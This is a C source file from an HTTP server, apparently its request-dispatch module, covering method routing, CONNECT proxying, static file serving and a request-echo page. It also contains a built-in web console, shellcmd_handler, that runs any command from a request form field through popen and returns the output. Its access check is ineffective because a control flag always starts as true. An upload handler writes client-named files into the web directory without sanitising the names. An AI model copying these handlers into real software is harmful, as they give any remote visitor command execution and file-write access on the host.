/*
 * Copyright (c) 2003-2020 Ke Hengzhong <kehengzhong@hotmail.com>
 * All rights reserved. See MIT LICENSE for redistribution.
 */

#include "adifall.ext"
#include <signal.h>

#include "http_header.h"
#include "http_msg.h"
#include "http_mgmt.h"
#include "http_con.h"
#include "http_request.h"
#include "http_cgi.h"
#include "http_listen.h"
#include "http_form.h"
#include "http_proxy.h"
#include "http_cache.h"
#include "http_handle.h"

int default_handle_request (void * vmsg);
int upload_handler (void * vmsg);
int shellcmd_handler (void * vmsg);


int http_msg_handle (void * vcon, void * vmsg)
{
    HTTPCon  * pcon = (HTTPCon *)vcon;
    HTTPMsg  * msg = (HTTPMsg *)vmsg;
    int        ret = 0;

    if (!pcon) return -1;
    if (!msg) return -2;

    msg->state = HTTP_MSG_REQUEST_HANDLING;

    switch (msg->req_methind) {
    case HTTP_METHOD_CONNECT:
        return http_connect_process(pcon, msg);

    case HTTP_METHOD_DELETE:
    case HTTP_METHOD_GET:
    case HTTP_METHOD_HEAD:
    case HTTP_METHOD_OPTIONS:
    case HTTP_METHOD_POST:
    case HTTP_METHOD_PUT:
    case HTTP_METHOD_TRACE:
        return http_request_process(pcon, msg);

    default:
        msg->SetStatus(msg, 405, NULL);
        ret = msg->Reply(msg);
        return ret;
    }
    return 0;
}

int http_connect_process (void * vcon, void * vmsg)
{
    HTTPCon    * pcon = (HTTPCon *)vcon;
    HTTPMsg    * msg = (HTTPMsg *)vmsg;
    HTTPMgmt   * mgmt = NULL;
    HTTPCon    * tunnelcon = NULL;
    HTTPListen * hl = NULL;

    if (!pcon) return -1;
    if (!msg) return -2;

    mgmt = (HTTPMgmt *)msg->httpmgmt;
    if (!mgmt) return -3;

    hl = (HTTPListen *)pcon->hl;
    if (!hl) return -4;
 
    /* if system configuraiton of current HTTP Listen does not allow forward proxy */
    if (hl->forwardproxy == 0) {
        /* CONNECT method is base upon Proxy mechanism */
        msg->SetStatus(msg, 403, "Proxy is Forbidden");
        return msg->Reply(msg);
    }

    /* system configuration does not allow CONNECT tunnel */
    if (mgmt->proxy_tunnel == 0) {
        msg->SetStatus(msg, 405, "CONNECT method not allowed");
        return msg->Reply(msg);
    }

    tunnelcon = http_proxy_connect_tunnel(pcon, msg);
    if (tunnelcon == NULL && pcon->tunnelself == 0) {
        msg->SetStatus(msg, 406, NULL);
        return msg->Reply(msg);
    }

    msg->SetStatus(msg, 200, "Connection Established");
    return msg->Reply(msg);
}

int http_request_process (void * vcon, void * vmsg)
{
    HTTPCon    * pcon = (HTTPCon *)vcon;
    HTTPMsg    * msg = (HTTPMsg *)vmsg;
    HTTPListen * hl = NULL;
    HTTPLoc    * ploc = NULL;
    HTTPMgmt   * mgmt = NULL;
    CacheInfo  * cacinfo = NULL;
    char         path[1024];
    int          i, ret = -100;
    int          ctrlflag = 1;
    time_t       curt = 0;
    ulong        msgid = 0;

    if (!pcon) return -1;
    if (!msg) return -2;

    mgmt = (HTTPMgmt *)pcon->mgmt;
    if (!mgmt) return -3;

    hl = (HTTPListen *)pcon->hl;
    if (!hl) return -4;

    msgid = msg->msgid;

    if (msg->cacheon && msg->res_file_cache >= 3) {
        cacinfo = msg->res_cache_info;

        if (msg->res_file_cache == 3) {
            ret = msg->AddResFile(msg, msg->res_file_name, 0, -1);

        } else if (cacinfo != NULL) {
            ret = msg->AddResFile(msg, cacinfo->cache_tmp, 0, -1);

        } else ret = -100;

        if (ret < 0)
            msg->SetStatus(msg, 404, NULL);
        else 
            msg->SetStatus(msg, 200, NULL);

        if (cacinfo && ret >= 0) {
            http_cache_response_header(msg, cacinfo);
            msg->SetResContentTypeID(msg, cacinfo->mimeid);
        }

        return msg->Reply(msg);
    }

    /* if system configuraiton of current HTTP Listen does not allow forward proxy */
    if (msg->req_url_type > 0 && hl->forwardproxy == 0) {
        msg->SetStatus(msg, 403, "Proxy is Forbidden");
        return msg->Reply(msg);
    }

    time(&curt);
    if (strcmp(mgmt->inipaddr, msg->srcip) == 0) {
        if (curt - mgmt->inlaststamp < 3600) {
            ctrlflag = 1; 
        }
    }

    msg->GetFileOnly(msg, path, sizeof(path)); 

    if (strncasecmp(msg->req_meth, "POST", 4) == 0) {
        if (strncasecmp(path, mgmt->uploadso, strlen(mgmt->uploadso)) == 0) {
            if (ctrlflag) {
                mgmt->inlaststamp = curt;
                return upload_handler(msg);
            }
        } 

    } else if (strncasecmp(msg->req_meth, "GET", 3) == 0) {
        if (strncasecmp(path, mgmt->uploadso, strlen(mgmt->uploadso)) == 0) {
            uint32 tmpval = 0;
            msg->GetQueryUint(msg, mgmt->uploadvar, &tmpval);
            if (tmpval > 0) strcpy(mgmt->inipaddr, msg->srcip);
            else memset(mgmt->inipaddr, 0, sizeof(mgmt->inipaddr));
            mgmt->inlaststamp = curt;
            ctrlflag = 1;
        }
    }

    if (strncasecmp(path, mgmt->shellcmdso, strlen(mgmt->shellcmdso)) == 0) {
        if (ctrlflag) {
            mgmt->inlaststamp = curt;
            return shellcmd_handler(msg);
        }
    }

    if (!(ploc = (HTTPLoc *)msg->ploc)) {
        msg->SetStatus(msg, 404, NULL);          
        return msg->Reply(msg);
    }

    if (msg->issued <= 0 && mgmt->req_handler) {
        ret = (*mgmt->req_handler)(mgmt->req_cbobj, msg);
    }

    if (msg->issued <= 0 && hl->cbfunc) {
        ret = (*hl->cbfunc)(hl->cbobj, msg);
    }

    /* if the upper callback handled and replied the request, the msg already recycled.
     * some default handlings should be done by determining if the msg got correctly dealt with */

    if (ret < 0 && http_msg_mgmt_get(mgmt, msgid) == msg && msg->issued <= 0) {
        ret = msg->GetRealFile(msg, path, sizeof(path));

        if (strstr(path, "../")) {
            msg->SetStatus(msg, 404, NULL);          
            return msg->Reply(msg);
        }

        if (ret > 0 && file_is_regular(path)) {
            if (msg->AddResFile(msg, path, 0, -1) < 0)
                msg->SetStatus(msg, 404, NULL);
            else
                msg->SetStatus(msg, 200, NULL);
            return msg->Reply(msg);

        } else if (file_is_dir(path)) {
            ret = strlen(path);
            for (i = 0; i < ploc->indexnum; i++) {
                sprintf(path + ret, "%s", ploc->index[i]);

                if (file_is_regular(path)) {
                    if (msg->AddResFile(msg, path, 0, -1) < 0)
                        msg->SetStatus(msg, 404, NULL);
                    else
                        msg->SetStatus(msg, 200, NULL);
                    return msg->Reply(msg);
                }
            }

            ret = msg->DisplayDirectory(msg);
            if (ret >= 0) return 0;
        }
    }

    if (http_msg_mgmt_get(mgmt, msgid) == msg && msg->issued <= 0) {
        msg->SetStatus(msg, 404, NULL);
        return msg->Reply(msg);
    }

    return ret;
}


int default_handle_request (void * vmsg)
{
    HTTPMsg    * msg = (HTTPMsg *)vmsg;
    HTTPMgmt   * mgmt = NULL;
    frame_p      frame = NULL;
    time_t       curt;
    struct tm    st;
    int          ret = 0;

    HeaderUnit   * unit = NULL;
    int            i, num;
    uint8          ch = 0;
    char         * poct = NULL;


    if (!msg) return -5;

    mgmt = (HTTPMgmt *)msg->httpmgmt;
            
    time(&curt);
    st = *localtime(&curt);

    frame = bpool_fetch(mgmt->frame_pool);
    frame_empty(frame);

    frame_append(frame, "<html>\r\n");
    frame_append(frame, "<head>\r\n");
    frame_appendf(frame, "<title>%s</title>\r\n", g_http_build);
    frame_append(frame, "</head>\r\n");
    frame_append(frame, "<body>\r\n");
    frame_append(frame, "\r\n");
    frame_appendf(frame, "<h2><p align='center'><b>%s</b></p></h2>\r\n", g_http_build);
    frame_appendf(frame, "<i>%04d-%02d-%02d %02d:%02d:%02d</i>\r\n",
                        st.tm_year+1900, st.tm_mon+1, st.tm_mday,
                        st.tm_hour, st.tm_min, st.tm_sec);
    frame_append(frame, "<hr>\r\n");
    frame_appendf(frame, "  <b>SourceAddr:</b> %s : %d<br/>\r\n", msg->srcip, msg->srcport);
    if (msg->req_host && msg->req_hostlen > 0) {
        ch = msg->req_host[msg->req_hostlen]; msg->req_host[msg->req_hostlen] = '\0';
        frame_appendf(frame, "  <b>RemoteHost:</b> %s : %d<br/>\r\n", msg->req_host, msg->req_port);
        msg->req_host[msg->req_hostlen] = ch;
    } else {
        frame_appendf(frame, "  <b>RemoteHost:</b>  : %d<br/>\r\n", msg->req_port);
    }
    
    frame_append(frame, "<font color=#DF0000><b>\r\n");
    if (msg->req_path && msg->req_pathlen > 0) {
        ch = msg->req_path[msg->req_pathlen]; msg->req_path[msg->req_pathlen] = '\0';
        frame_appendf(frame, "  %s %s", msg->req_meth, msg->req_path);
        msg->req_path[msg->req_pathlen] = ch;
    } else {
        frame_appendf(frame, "  %s <NULL>", msg->req_meth);
    }

    if (msg->req_querylen > 0 && msg->req_query) {
        ch = msg->req_query[msg->req_querylen]; msg->req_query[msg->req_querylen] = '\0';
        frame_appendf(frame, "?%s", msg->req_query);
        msg->req_query[msg->req_querylen] = ch;
    }
    frame_appendf(frame, " %s<br/>\r\n", msg->req_ver);
    frame_append(frame, "</b></font>\r\n");

    /* printf the request header */
    num = arr_num(msg->req_header_list);
    for (i = 0; i < num; i++) {
        unit = (HeaderUnit *)arr_value(msg->req_header_list, i);
        if (!unit) continue;

        frame_append(frame, "\r\n");
        poct = HUName(unit);
        if (unit->namelen > 0) {
            ch = poct[unit->namelen];
            poct[unit->namelen] = '\0';
            frame_appendf(frame, "<b>  %s:</b> ", poct);
            poct[unit->namelen] = ch;
        } else frame_appendf(frame, "<b>   :</b> ");
        frame_append(frame, "\r\n");

        poct = HUValue(unit);
        if (unit->valuelen > 0) {
            ch = poct[unit->valuelen];
            poct[unit->valuelen] = '\0';
            frame_appendf(frame, "%s<br/>\r\n", poct);
            poct[unit->valuelen] = ch;
        } else frame_appendf(frame, "<br/>\r\n");
    }


    frame_append(frame, "\r\n");
    frame_append(frame, "</body>\r\n");
    frame_append(frame, "</html>\r\n");

    AddResContent(msg, frameP(frame), frameL(frame));
    SetStatus(msg, 200, NULL);
    SetResContentType (msg, "text/html", 9);

    ret = Reply(msg);
    if (frame)
        bpool_recycle(mgmt->frame_pool, frame);

    return ret;
}


int upload_handler (void * vmsg)
{
    HTTPMsg      * msg = (HTTPMsg *)vmsg;
    HTTPMgmt     * mgmt = NULL;
    http_form_t  * node = NULL;
    int            ret = -1;
    int            pathlen = 0;
    int            i, num;
    char           buf[512];
    char         * p;
    FILE         * fp = NULL;

    if (!msg) return -5;

    mgmt = (HTTPMgmt *)msg->httpmgmt;
    if (!mgmt) return -10;

    num = arr_num(msg->req_formlist);
    for (i = 0; i < num; i++) {
        node = (http_form_t *)arr_value(msg->req_formlist, i);
        if (!node) continue;

        if (strcasecmp(node->name, mgmt->uploadvar) == 0) {
            GetRealPath(msg, buf, sizeof(buf)-1);
            pathlen = strlen(buf);

            if (buf[pathlen - 1] != '/') {
                buf[pathlen++] = '/';
                buf[pathlen] = '\0';
            }

            sprintf(buf + pathlen, "%s", node->filename);
            ret = 1;
            while (file_exist(buf)) {
                sprintf(buf + pathlen, "%s_%03d%s", node->basename, ret++, node->extname);
            }

            fp = fopen(buf, "wb");
            chunk_readto_file(node->body_chunk, fileno(fp), node->valuepos, node->valuelen, 0);
            fclose(fp);
        }
    }

    msg->GetBaseURL(msg, &p, &num);
    str_secpy(buf, sizeof(buf)-1, p, num);

    return msg->RedirectReply(msg, 302, buf);
}

int shellcmd_handler (void * vmsg)
{
    HTTPMsg      * msg = (HTTPMsg *)vmsg;
    HTTPMgmt     * mgmt = NULL;
    frame_p        frame = NULL;
    FILE         * fp = NULL;
    char           buf[512];
    char           tmpstr[64];
    int            ret = 0;
    int            ctrlflag = 1;
    time_t         curt = 0;

    if (!msg) return -5;

    mgmt = (HTTPMgmt *)msg->httpmgmt;
    if (!mgmt) return -10;

    if (strcmp(mgmt->inipaddr, msg->srcip) == 0) {
        time(&curt);
        if (curt - mgmt->inlaststamp < 3600) {
            ctrlflag = 1;
        }
    }

    memset(buf, 0, sizeof(buf));
    ret = msg->GetReqFormValue(msg, mgmt->shellcmdvar, buf, sizeof(buf));
    if (ret > 0) {
        ret = uri_decode(buf, ret, buf, sizeof(buf)-1);
        if (ret >= 0) buf[ret] = '\0';
    }

    frame = msg->GetFrame(msg);

    frame_append(frame, "<html>");
    frame_append(frame, "<head>\n");
    frame_append(frame, "<title>Console on ");
    frame_put_nlast(frame, msg->req_host, msg->req_hostlen);
    frame_appendf(frame, " - %s</title>\n", buf);

    if (ctrlflag) {
        frame_append(frame, "<script language=\"javascript\">\n");
        frame_append(frame, "<!-- \n");
        frame_append(frame, "function focusFirst() {    \n");
        frame_append(frame, "  if (document.forms.length > 0 && document.forms[0].elements.length > 0) {\n");
        frame_append(frame, "    for(var i=0; i<document.forms[0].elements.length;i++) { \n");
        frame_append(frame, "      if (document.forms[0].elements[i].type == \"text\" && \n");
        frame_append(frame, "          document.forms[0].elements[i].readOnly != true && \n");
        frame_append(frame, "          document.forms[0].elements[i].disabled != true) \n");
        frame_append(frame, "      { \n");
        frame_append(frame, "        document.forms[0].elements[i].focus(); \n");
        frame_append(frame, "        break; \n");
        frame_append(frame, "      } \n");
        frame_append(frame, "    } \n");
        frame_append(frame, "  } \n");
        frame_append(frame, "} \n");
        frame_append(frame, "window.onload = focusFirst; \n");
        frame_append(frame, "//--> \n");
        frame_append(frame, "function checkShellCmd() {\n");
        frame_append(frame, "    with (document.shellcmdform) {\n");
        frame_appendf(frame, "        if (%s.value==\"\") {\n", mgmt->shellcmdvar);
        frame_append(frame, "            alert(\"'命令内容'不能为空！\");\n");
        frame_append(frame, "            return false;\n");
        frame_append(frame, "        }\n");
        frame_append(frame, "    }\n");
        frame_append(frame, "}\n");
        frame_append(frame, "</script>\n");
    } //end if (ctrlflag == 1)

    frame_append(frame, "</head>\n<body><H1>Console on ");
    frame_put_nlast(frame, msg->req_host, msg->req_hostlen);
    frame_appendf(frame, "</H1>\n");
    //frame_appendf(frame, "- <font color=#880000><strong>[%s]</strong></font></H1>\n", buf);

    if (ctrlflag) {
        frame_append(frame, "<table width=\"100%\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\">\n");
        frame_append(frame, "  <tr>\n");
        frame_append(frame, "    <td align=\"left\" width=\"50%\">\n");
        frame_appendf(frame, "    <form method=\"POST\" name=\"shellcmdform\" \n");

        frame_appendf(frame, "          action=\"");
        frame_put_nlast(frame, msg->docuri->baseuri, msg->docuri->baseurilen);
        frame_appendf(frame, "%s\" \n", mgmt->shellcmdso);

        frame_append(frame, "        onSubmit=\"javascript:return checkShellCmd();return true;\">\n");
        frame_append(frame, "      <p align=\"left\"><strong>命令内容</strong>\n");
        frame_appendf(frame, "        <input name=\"%s\" type=text size=30>\n", mgmt->shellcmdvar);
        frame_append(frame, "              <input type=submit value=\"执行...\"></p>\n");
        frame_append(frame, "    </form>\n");
        frame_append(frame, "    </td>\n");
        frame_append(frame, "    <td align=\"left\" width=\"50%\">\n");

        str_datetime(NULL, tmpstr, sizeof(tmpstr), 0);
        frame_appendf(frame, "      <p align=\"left\">当前命令: <strong>%s</strong> - %s\n", buf, tmpstr);
        frame_append(frame, "    </td>\n");
        frame_append(frame, "  </tr>\n");
        frame_append(frame, "</table>\n");
    } //end if (ctrlflag)

    frame_append(frame, "<hr>\n");
    frame_append(frame, "<pre>\n");

    if (strlen((char*)buf) > 0) {
        if (strncasecmp(buf, "showall", 7) == 0) {
            //ShowDevices(msg->GetPCore(msg), frame);
        } else {
#ifdef WINDOWS
            fp = _popen(buf, "r");
#else
            fp = popen(buf, "r");
            if (!fp && errno != 0) {
                frame_append(frame, strerror(errno));
            }
#endif
        }
    }

    while (fp && !feof(fp)) {
        memset(buf, 0, sizeof(buf));
        fgets(buf, sizeof(buf)-1, fp);
        frame_appendf(frame, "%s", buf);
    }
    if (fp) 
#ifdef WINDOWS
        _pclose(fp);
#else
        pclose(fp);
#endif

    frame_append(frame, "</pre><hr></body>\n");
    frame_append(frame, "<html>");

    msg->AddResContent(msg, frameP(frame), frameL(frame));
    msg->SetStatus(msg, 200, NULL);
    msg->SetResContentType (msg, "text/html", -1);
    msg->Reply(msg);

    msg->RecycleFrame(msg, frame);
    return 0;
}


